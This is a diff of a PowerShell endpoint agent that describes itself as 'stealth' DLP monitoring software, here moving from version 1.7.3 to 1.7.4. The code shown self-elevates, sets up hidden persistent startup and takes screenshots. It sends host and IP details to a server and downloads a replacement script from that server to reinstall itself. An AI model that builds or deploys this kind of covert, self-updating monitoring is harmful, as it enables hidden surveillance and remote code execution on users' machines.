@@ -3,7 +3,7 @@ param(
     [switch]$Install
 )
 
-# Version: 1.7.3
+# Version: 1.7.4
 # Description: Extreme-Compat User-Mode Agent with stable ID detection.
 
 # 0. SELF-ELEVATION (Needed for Security Logs)
@@ -69,7 +69,7 @@ try {
 # 3. ROBUST INSTALLATION LOGIC
 function Install-StealthAgent {
     try {
-        Log-Message "Initiating User-Level Persistent Install v1.7.3..."
+        Log-Message "Initiating User-Level Persistent Install v1.7.4..."
         $TaskName = "UEA_Support_Persistence"
         Get-ScheduledTask -TaskName $TaskName -ErrorAction SilentlyContinue | Stop-ScheduledTask -ErrorAction SilentlyContinue
         Unregister-ScheduledTask -TaskName $TaskName -Confirm:$false -ErrorAction SilentlyContinue | Out-Null
@@ -85,7 +85,7 @@ function Install-StealthAgent {
 
         Copy-Item -Path $SourceFile -Destination $ScriptPath -Force -ErrorAction Stop
         
-        $Config = @{ ServerUrl = $ServerUrl; Version = "1.7.3" }
+        $Config = @{ ServerUrl = $ServerUrl; Version = "1.7.4" }
         $Config | ConvertTo-Json | Out-File -FilePath $ConfigPath -Force
         
         $VbsMainPath = "$InstallDir\uea_stealth.vbs"
@@ -130,7 +130,7 @@ try {
         if ($SavedConfig) { $ServerUrl = $SavedConfig.ServerUrl }
     }
 
-    Log-Message "Agent v1.7.3 Started (Admin=$IsAdmin). ID: $AgentId"
+    Log-Message "Agent v1.7.4 Started (Admin=$IsAdmin). ID: $AgentId"
     
     # Define Win32 API for foreground window
     $Win32Code = @'
@@ -141,7 +141,9 @@ try {
         public static extern IntPtr GetForegroundWindow();
     }
 '@
-    Add-Type -TypeDefinition $Win32Code
+    if (-not ("Win32" -as [type])) {
+        Add-Type -TypeDefinition $Win32Code
+    }
     
     function Take-Screenshot {
         try {
@@ -230,15 +232,15 @@ try {
             }
             
             $Payload = @{
-                agentId = $AgentId; serialNumber = $SerialNumber; version = "1.7.3"; status = "online"
+                agentId = $AgentId; serialNumber = $SerialNumber; version = "1.7.4"; status = "online"
                 deviceName = $env:COMPUTERNAME; os = $OSInfo; publicIp = $CachedPubIp; localIp = $CachedLocIp; isp = "Enterprise"
             }
             $BodyJson = $Payload | ConvertTo-Json
             $Response = try { 
                 Invoke-RestMethod -Method Post -Uri "$ServerUrl/api/agent/heartbeat" -Body $BodyJson -ContentType "application/json" -TimeoutSec 10 
             } catch { 
-                Log-Message "Heartbeat Missed: $($_.Exception.Message)"
-                throw $_ 
+                Log-Message "Heartbeat Missed (Retrying): $($_.Exception.Message)"
+                # No throw here - allows retry in next loop
             }
 
             # --- DLP MONITORING ---
@@ -292,7 +294,7 @@ try {
             Check-BlockedEvents
             # ---------------------
 
-            if ($Response.latestVersion -and ([version]$Response.latestVersion -gt [version]"1.7.3")) {
+            if ($Response.latestVersion -and ([version]$Response.latestVersion -gt [version]"1.7.4")) {
                 Invoke-WebRequest -Uri "$ServerUrl/api/agent/update" -OutFile "$ScriptPath" -UseBasicParsing | Out-Null
                 Install-StealthAgent
                 $VbsRestart = "$InstallDir\restart.vbs"
